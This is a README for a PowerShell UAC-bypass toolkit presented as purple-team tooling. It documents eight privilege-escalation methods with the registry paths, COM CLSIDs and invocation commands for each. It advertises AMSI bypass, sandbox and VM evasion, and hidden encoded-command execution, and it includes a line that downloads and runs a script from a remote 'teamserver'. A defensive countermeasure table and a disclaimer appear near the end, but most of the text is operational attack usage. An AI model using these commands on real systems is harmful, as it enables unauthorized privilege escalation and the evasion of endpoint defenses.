# Invoke-UACBypass — Purple Team UAC Bypass Toolkit

PowerShell implementations of documented UAC bypass techniques, built for
authorized **red/purple-team engagements** against hardened endpoints.

> **Authorization required.**
> This toolkit must only be used under a signed Statement of Work (SOW) and
> explicit Rules of Engagement (RoE). Unauthorized use is illegal.

---

## Overview

Each technique is a self-contained PowerShell script with:

- **AMSI mitigation** (reflection-based `amsiInitFailed` bypass)
- **Anti-sandbox timing gate** (SHA-256 loop with elapsed-time check)
- **VM/hypervisor artefact detection** (WMI, registry, process list, BIOS)
- **Mouse-activity liveness check**
- **Windows version / UAC policy introspection**
- **Automatic cleanup** of any registry keys or files created
- **Inline purple-team notes** for blue-team debrief

The core framework (`Core/Invoke-UACCore.ps1`) provides shared helper functions that
can be dot-sourced before individual method scripts, or each method script can be used
standalone (each embeds a minimal inline version of the gates).

Techniques are sourced from the **UACME** project by hfiref0x
(`github.com/hfiref0x/UACME`).

---

## File Structure

```
Invoke-UACBypass/
├── Core/
│   └── Invoke-UACCore.ps1          # Shared framework (AMSI, sandbox, helpers)
├── Methods/
│   ├── Invoke-FodHelper.ps1        # Method 33 / 67 — fodhelper.exe
│   ├── Invoke-ComputerDefaults.ps1 # Method 62    — computerdefaults.exe
│   ├── Invoke-SluiBypass.ps1       # Method 61    — slui.exe / changepk.exe
│   ├── Invoke-CMLuaUtil.ps1        # Method 41    — ICMLuaUtil COM elevation
│   ├── Invoke-DccwCOM.ps1          # Method 43    — IColorDataProxy COM + registry
│   ├── Invoke-WSReset.ps1          # Method 68    — WSReset.exe protocol hijack
│   ├── Invoke-CurVer.ps1           # Method 70    — ProgID CurVer redirection
│   └── Invoke-DiskCleanup.ps1      # Method 34    — Volatile Environment + SilentCleanup
└── README.md
```

---

## Quick Reference

| Script | UACME # | Technique | Min Build | AlwaysNotify | Disk | Status |
|--------|---------|-----------|-----------|--------------|------|--------|
| Invoke-FodHelper | 33/67 | fodhelper ms-settings registry | 10240 | ✗ | None | UNFIXED |
| Invoke-ComputerDefaults | 62 | computerdefaults ms-settings registry | 17134 | ✗ | None | UNFIXED |
| Invoke-SluiBypass | 61 | slui/changepk ms-settings registry | 14393 | ✗ | None | UNFIXED |
| Invoke-CMLuaUtil | 41 | ICMLuaUtil elevated COM ShellExec | 7600 | ✗ | None | UNFIXED |
| Invoke-DccwCOM | 43 | IColorDataProxy + DisplayCalibrator | 7600 | ✗ | None | UNFIXED |
| Invoke-WSReset | 68 | WSReset ms-windows-store protocol | 17763 | ✗ | None | UNFIXED |
| Invoke-CurVer | 70 | ProgID CurVer hijack (indirect) | 10240 | ✗ | None | UNFIXED |
| Invoke-DiskCleanup | 34 | Volatile windir + SilentCleanup task | 9600 | ✓ | Temp EXE | UNFIXED |

---

## Usage

### In-memory execution (recommended)

Load and run entirely in RAM — no files written to disk for most methods:

```powershell
# Stage 1: AMSI bypass (optional — each script includes its own inline)
# Stage 2: Load core framework (optional — dot-source for shared helpers)
. .\Core\Invoke-UACCore.ps1

# Stage 3: Invoke method
. .\Methods\Invoke-FodHelper.ps1 -Payload "cmd.exe" -SkipChecks
```

Or as a one-liner via encoded command:

```powershell
powershell.exe -NoP -NonI -W Hidden -EncodedCommand <base64-of-script>
```

### Running over the wire (fileless)

```powershell
# Load directly from a web server or SMB share
IEX (New-Object Net.WebClient).DownloadString('http://teamserver/Invoke-CMLuaUtil.ps1')
Invoke-CMLuaUtilBypass -Payload "C:\Windows\System32\cmd.exe" -SkipAMSI
```

---

## Method Details

### Method 33 / 67 — FodHelper (`Invoke-FodHelper.ps1`)

**Mechanism:** `fodhelper.exe` (autoElevate manifest) reads `HKCU\Software\Classes\ms-settings\Shell\Open\command` on launch. We plant our payload there before launching it.

```powershell
# Basic
Invoke-FodHelperBypass -Payload "cmd.exe"

# Protocol variant (Method 67)
Invoke-FodHelperBypass -Payload "cmd.exe" -UseProtocolVariant

# Skip all checks (use in controlled lab)
Invoke-FodHelperBypass -Payload "cmd.exe" -SkipChecks
```

**Registry path written:**
`HKCU\Software\Classes\ms-settings\Shell\Open\command`

**CS detection expected:** High — this is one of the most well-known techniques.

---

### Method 62 — ComputerDefaults (`Invoke-ComputerDefaults.ps1`)

**Mechanism:** Same registry key as FodHelper, but triggers via `computerdefaults.exe`. Tests whether CS detections are binary-specific or key-specific.

```powershell
Invoke-ComputerDefaultsBypass -Payload "cmd.exe"
```

**Requires:** Build 17134+ (RS4 / April 2018 Update)

---

### Method 61 — Slui / ChangePk (`Invoke-SluiBypass.ps1`)

**Mechanism:** Same `ms-settings` registry hijack, triggered by `slui.exe` or `changepk.exe`. Tests breadth of binary-specific CS rules.

```powershell
Invoke-SluiBypass -Payload "cmd.exe"
Invoke-SluiBypass -Payload "cmd.exe" -UseChangePk
```

**Requires:** Build 14393+ (RS1)

---

### Method 41 — CMLuaUtil (`Invoke-CMLuaUtil.ps1`)

**Mechanism:** Uses the COM elevation moniker to instantiate the CMSTPLUA auto-elevated COM server. No registry writes. `ICMLuaUtil::ShellExec()` runs the payload at High integrity from `DllHost.exe`.

```powershell
Invoke-CMLuaUtilBypass -Payload "C:\Windows\System32\cmd.exe"
Invoke-CMLuaUtilBypass -Payload "C:\Windows\System32\cmd.exe" -Arguments "/c whoami"
```

**CLSID:** `{3E5FC7F9-9A51-4367-9063-A120244FBEC7}` (CMSTPLUA)
**IID:** `{6EDD6D74-C007-4E75-B76A-E5740995E24C}` (ICMLuaUtil)

**Operational value:** Highest — no registry footprint, works from Win 7 through Win 11.

---

### Method 43 — DccwCOM (`Invoke-DccwCOM.ps1`)

**Mechanism:** Two-stage. Writes payload to `HKCU\...\ICM\Calibration\DisplayCalibrator` (user-writable, rarely monitored), then uses `IColorDataProxy::LaunchDccw()` to start `dccw.exe` elevated, which reads and executes the calibration application.

```powershell
Invoke-DccwCOMBypass -Payload "C:\Windows\System32\cmd.exe"
```

**CLSID:** `{D2E7041B-2927-42fb-8E9F-7CE93B6DC937}` (ColorDataProxy)

**Operational value:** Tests whether less-known registry paths are monitored.

---

### Method 68 — WSReset (`Invoke-WSReset.ps1`)

**Mechanism:** `WSReset.exe` reads `ms-windows-store:` URI handler. Plant payload at `HKCU\Software\Classes\ms-windows-store\Shell\Open\command`. Tests coverage of non-`ms-settings` class names.

```powershell
Invoke-WSResetBypass -Payload "cmd.exe"
```

**Requires:** Build 17763+ (RS5 / October 2018 Update)

---

### Method 70 — CurVer (`Invoke-CurVer.ps1`)

**Mechanism:** Instead of writing directly to `ms-settings\Shell\Open\command`, uses a ProgID `CurVer` redirect: `ms-settings\CurVer = "lzx32"` → `lzx32\Shell\Open\command = payload`. Evades narrow IOA rules that watch only the direct path.

```powershell
Invoke-CurVerBypass -Payload "cmd.exe"

# Custom alias for better OpSec
Invoke-CurVerBypass -Payload "cmd.exe" -AliasProgID "Win32App.1"

# Use computerdefaults.exe as trigger
Invoke-CurVerBypass -Payload "cmd.exe" -TriggerBinary "computerdefaults"
```

---

### Method 34 — DiskCleanup (`Invoke-DiskCleanup.ps1`)

**Mechanism:** Sets `HKCU\Volatile Environment\windir` to a fake temp directory, then triggers the `SilentCleanup` scheduled task which runs elevated. The task expands `%windir%` to our fake root, loading our `cleanmgr.exe`.

**⚠ Unique capability:** Works under **AlwaysNotify UAC** — the only method in this toolkit that does.

**⚠ Disk artefact:** Writes a temporary EXE to disk (removed after execution).

```powershell
# CscCompile mode (default) — compiles a tiny launcher via csc.exe
Invoke-DiskCleanupBypass -PayloadCommand "cmd.exe /c whoami > C:\Temp\r.txt"

# CopyCmdExe mode — no compilation, but cmd.exe window appears
Invoke-DiskCleanupBypass -PayloadCommand "" -PayloadBinaryMode CopyCmdExe
```

---

## Core Framework (`Invoke-UACCore.ps1`)

Dot-source before any method for shared helper access:

```powershell
. .\Core\Invoke-UACCore.ps1

# Check environment before selecting method
$gate = Invoke-PreflightGate -SkipVMCheck
if (-not $gate.Safe) { Write-Host $gate.Reason; exit }

$ver = $gate.Version
Write-Host "Build: $($ver.Build) | Win11: $($ver.IsWin11) | AlwaysNotify: $($gate.UAC.AlwaysNotify)"

# Select method based on results
if ($gate.UAC.AlwaysNotify) {
    # Only DiskCleanup works
    . .\Methods\Invoke-DiskCleanup.ps1 -PayloadCommand $cmd
}
elseif ($ver.IsRS4) {
    # CMLuaUtil preferred (no registry footprint)
    . .\Methods\Invoke-CMLuaUtil.ps1 -Payload $exe
}
else {
    . .\Methods\Invoke-FodHelper.ps1 -Payload $exe
}
```

---

## Environment Checks

Each script runs the following gates (can be skipped with `-SkipChecks`):

| Check | Method | What it detects |
|-------|--------|-----------------|
| Timing gate | SHA-256 loop (300×64KB) | Clock-acceleration in sandboxes |
| VM artefacts | WMI + registry + processes | VMware, VirtualBox, Hyper-V, Xen |
| Mouse activity | GetCursorPos delta (2.5s) | Automated environments |
| OS build | Registry CurrentBuildNumber | Minimum version enforcement |
| UAC policy | ConsentPromptBehaviorAdmin | AlwaysNotify / method compatibility |
| Admin token | WindowsPrincipal.IsInRole | Already-elevated sessions |

---

## Purple-Team Usage Recommendations

### Sequencing for gap analysis

Run methods in this order to map detection coverage:

1. **FodHelper** (Method 33) — most-known; expect detection; validates CS AMSI/process-graph is working
2. **WSReset** (Method 68) — same key mechanism, different binary; tests binary-specific vs key-specific rules
3. **CurVer** (Method 70) — different registry path; tests if rules are scoped to ms-settings\Shell\Open\command specifically
4. **CMLuaUtil** (Method 41) — no registry write; tests COM elevation moniker detection
5. **DccwCOM** (Method 43) — obscure registry path; tests breadth of registry monitoring
6. **DiskCleanup** (Method 34) — AlwaysNotify-compatible; tests scheduled task telemetry and Volatile Environment monitoring

### Debrief talking points

For each method run, capture:
- **Did AMSI fire?** (script blocked before executing)
- **Did CS alert?** (process graph / behavior detection)
- **Alert latency** (prevention vs detection)
- **Which specific IOA rule fired?** (binary-specific, registry-specific, or correlation-based)
- **What evaded?** (note for detection improvement)

---

## Defensive Hardening Reference

| Countermeasure | Methods Blocked |
|----------------|-----------------|
| UAC = AlwaysNotify (ConsentPromptBehaviorAdmin = 2) | 33, 41, 43, 61, 62, 67, 68, 70 |
| SACL on HKCU\Software\Classes | 33, 61, 62, 67, 68, 70 |
| SACL on HKCU\Volatile Environment | 34 |
| SACL on HKCU\...\ICM\Calibration | 43 |
| CS IOA: fodhelper/computerdefaults/wsreset child spawn | 33, 62, 67, 68 |
| CS IOA: DllHost.exe child spawn | 41 |
| CS IOA: dccw.exe child spawn | 43 |
| CS IOA: schtasks /Run on SilentCleanup | 34 |
| Sysmon Rule: ms-settings\Shell\Open\command write | 33, 61, 62, 67 |
| Sysmon Rule: ms-windows-store\Shell\Open\command write | 68 |

---

## MITRE ATT&CK

**Tactic:** Privilege Escalation
**Technique:** [T1548.002 — Abuse Elevation Control Mechanism: Bypass UAC](https://attack.mitre.org/techniques/T1548/002/)

---

## Legal

All techniques are adaptations of publicly documented research (UACME, academic papers, security conference presentations). This toolkit is provided for authorized security testing only. The authors accept no liability for unauthorized use.

**References:**
- UACME by hfiref0x: https://github.com/hfiref0x/UACME
- MITRE ATT&CK T1548.002: https://attack.mitre.org/techniques/T1548/002/
- Microsoft's stance on UAC: https://devblogs.microsoft.com/oldnewthing/20160816-00/?p=94105
